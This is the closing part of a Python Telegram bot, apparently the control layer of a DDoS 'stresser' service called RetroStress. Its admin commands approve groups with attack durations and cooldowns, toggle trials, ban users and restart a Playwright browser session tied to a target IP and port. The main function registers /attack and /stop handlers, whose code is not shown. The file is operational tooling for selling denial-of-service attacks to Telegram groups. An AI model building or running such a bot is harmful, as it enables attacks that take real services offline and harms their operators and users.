async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MASTER_USER_ID:
        await update.message.reply_text("⛔ Access Denied. Master only.")
        return
    
    cursor.execute("SELECT COUNT(*) FROM groups WHERE approved = 1")
    total_groups = cursor.fetchone()[0]
    
    await update.message.reply_text(
        "╔════════════════════════════════════╗\n"
        "║      👑 ADMIN CONTROL PANEL       ║\n"
        "╠════════════════════════════════════╣\n"
        f"║  📢 Groups: {total_groups}                   ║\n"
        f"║  ⚡ Active Attacks: {len(_active_attacks)}              ║\n"
        f"║  🚫 Blocked Ports: {len(BLACKLISTED_PORTS)}              ║\n"
        "╠════════════════════════════════════╣\n"
        "║  📌 COMMANDS:                    ║\n"
        "║  /approve_group <ID>             ║\n"
        "║  /disapprove_group <ID>          ║\n"
        "║  /toggle_trial <ID>              ║\n"
        "║  /blacklist_ports                ║\n"
        "║  /users                          ║\n"
        "║  /banuser <user_id>              ║\n"
        "║  /unban <user_id>                ║\n"
        "║  /restart - Full restart         ║\n"
        "╚════════════════════════════════════╝"
    )


async def approve_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MASTER_USER_ID:
        await update.message.reply_text("⛔ Master only.")
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /approve_group <GROUP_ID>")
        return
    try:
        gid = int(context.args[0])
        cursor.execute(
            "INSERT OR REPLACE INTO groups (group_id, approved, duration, cooldown, trial_enabled) "
            "VALUES (?, 1, 120, 100, 1)",
            (gid,)
        )
        conn.commit()
        await update.message.reply_text(f"✅ Group {gid} approved!")
    except Exception:
        await update.message.reply_text("❌ Invalid group ID.")


async def disapprove_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MASTER_USER_ID:
        await update.message.reply_text("⛔ Master only.")
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /disapprove_group <GROUP_ID>")
        return
    try:
        gid = int(context.args[0])
        cursor.execute("DELETE FROM groups WHERE group_id = ?", (gid,))
        conn.commit()
        await update.message.reply_text(f"✅ Group {gid} removed.")
    except Exception:
        await update.message.reply_text("❌ Invalid group ID.")


async def toggle_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MASTER_USER_ID:
        await update.message.reply_text("⛔ Master only.")
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /toggle_trial <GROUP_ID>")
        return
    try:
        gid = int(context.args[0])
        cursor.execute("SELECT trial_enabled FROM groups WHERE group_id = ?", (gid,))
        row = cursor.fetchone()
        if not row:
            await update.message.reply_text("❌ Group not approved.")
            return
        new_val = 0 if row[0] else 1
        cursor.execute("UPDATE groups SET trial_enabled = ? WHERE group_id = ?", (new_val, gid))
        conn.commit()
        await update.message.reply_text(f"✅ Trial {'ENABLED' if new_val else 'DISABLED'} for group {gid}")
    except Exception:
        await update.message.reply_text("❌ Invalid group ID.")


async def blacklist_ports(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MASTER_USER_ID:
        await update.message.reply_text("⛔ Master only.")
        return
    blocked = ", ".join(str(p) for p in sorted(BLACKLISTED_PORTS))
    await update.message.reply_text(
        "╔════════════════════════════════════╗\n"
        "║      🚫 BLACKLISTED PORTS          ║\n"
        "╠════════════════════════════════════╣\n"
        f"║  {blocked} ║\n"
        "╠════════════════════════════════════╣\n"
        f"║  Total: {len(BLACKLISTED_PORTS)} ports blocked   ║\n"
        "╚════════════════════════════════════╝"
    )


async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MASTER_USER_ID:
        await update.message.reply_text("⛔ Access Denied. Master only.")
        return
    
    cursor.execute(
        "SELECT user_id, username, first_name, last_name, last_used "
        "FROM user_activity ORDER BY last_used DESC"
    )
    rows = cursor.fetchall()
    if not rows:
        await update.message.reply_text("📊 No users have used the bot yet.")
        return
    
    response = "╔════════════════════════════════════╗\n"
    response += "║      👥 USER ACTIVITY LIST        ║\n"
    response += "╠════════════════════════════════════╣\n"
    for row in rows:
        uid, username, first, last, last_used = row
        name = first or ""
        if last:
            name += f" {last}"
        if username:
            name += f" (@{username})"
        if not name.strip():
            name = "Unknown"
        response += f"║ ID: {uid}\n║ Name: {name[:30]}\n║ Last: {last_used}\n"
        response += "║────────────────────────────────────║\n"
    response += "╚════════════════════════════════════╝"
    
    if len(response) > 4000:
        await update.message.reply_text("📊 Too many users. Use /users_full for complete list.")
    else:
        await update.message.reply_text(response)


async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MASTER_USER_ID:
        await update.message.reply_text("⛔ Access Denied. Master only.")
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /banuser <USER_ID>")
        return
    try:
        uid = int(context.args[0])
        if is_user_banned(uid):
            await update.message.reply_text(f"ℹ️ User {uid} is already banned.")
            return
        cursor.execute("INSERT INTO banned_users (user_id) VALUES (?)", (uid,))
        conn.commit()
        await update.message.reply_text(f"✅ User {uid} has been banned.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Provide a numeric ID.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")


async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MASTER_USER_ID:
        await update.message.reply_text("⛔ Access Denied. Master only.")
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /unban <USER_ID>")
        return
    try:
        uid = int(context.args[0])
        if not is_user_banned(uid):
            await update.message.reply_text(f"ℹ️ User {uid} is not currently banned.")
            return
        cursor.execute("DELETE FROM banned_users WHERE user_id = ?", (uid,))
        conn.commit()
        await update.message.reply_text(f"✅ User {uid} has been unbanned.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")


# ===== NEW /RESTART COMMAND (ADMIN ONLY) =====
async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin-only: completely restart the browser session."""
    if update.effective_user.id != MASTER_USER_ID:
        await update.message.reply_text("⛔ Access Denied. Master only.")
        return
    
    await update.message.reply_text("🔄 Restarting browser session...")
    
    # Cancel any running attack
    if state.running:
        state.stop_requested = True
        if state.task and not state.task.done():
            state.task.cancel()
        await asyncio.sleep(1)
        state.running = False
        state.stop_requested = False
    
    # Close existing browser and playwright
    try:
        if state.page:
            await state.page.close()
        if state.browser:
            await state.browser.close()
        if state.playwright:
            await state.playwright.stop()
    except Exception as e:
        logger.warning(f"⚠️ Error during cleanup: {e}")
    
    # Reset state
    state.panel_ready = False
    state.auth_completed = False
    state.page = None
    state.browser = None
    state.playwright = None
    state.ip = None
    state.port = None
    state.last_check = None
    
    # Re-initialize
    if await init_browser_and_panel(update):
        await update.message.reply_text("✅ Restart completed successfully.")
    else:
        await update.message.reply_text("❌ Restart failed. Please try /start manually.")


# ===== MAIN =====
def main():
    logger.info("🚀 Starting RetroStress Bot - SAME PAGE FLOW")
    logger.info("👁️ Browser: VISIBLE")
    logger.info("📌 Auth + START TEST button click flow")
    logger.info("⚡ SLOW_MO = 0 (instant actions)")
    logger.info("🔍 /recheck command available")
    logger.info("🔄 /restart command (admin only)")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("recheck", recheck_command))
    app.add_handler(CommandHandler("help", help_command))
    
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("approve_group", approve_group))
    app.add_handler(CommandHandler("disapprove_group", disapprove_group))
    app.add_handler(CommandHandler("toggle_trial", toggle_trial))
    app.add_handler(CommandHandler("blacklist_ports", blacklist_ports))
    app.add_handler(CommandHandler("users", users_list))
    app.add_handler(CommandHandler("banuser", ban_user))
    app.add_handler(CommandHandler("unban", unban_user))
    app.add_handler(CommandHandler("restart", restart_command))  # new admin-only restart
    
    logger.info("✅ Bot running!")
    logger.info("📌 /start -> auth then click START TEST button")
    logger.info("📌 /attack -> target change + attack start")
    logger.info("📌 /recheck -> verify all components without restart")
    logger.info("📌 /restart -> admin-only full restart")
    
    try:
        app.run_polling()
    finally:
        if state.browser:
            asyncio.run(state.browser.close())
        if state.playwright:
            asyncio.run(state.playwright.stop())
        conn.close()


if __name__ == "__main__":
    main()
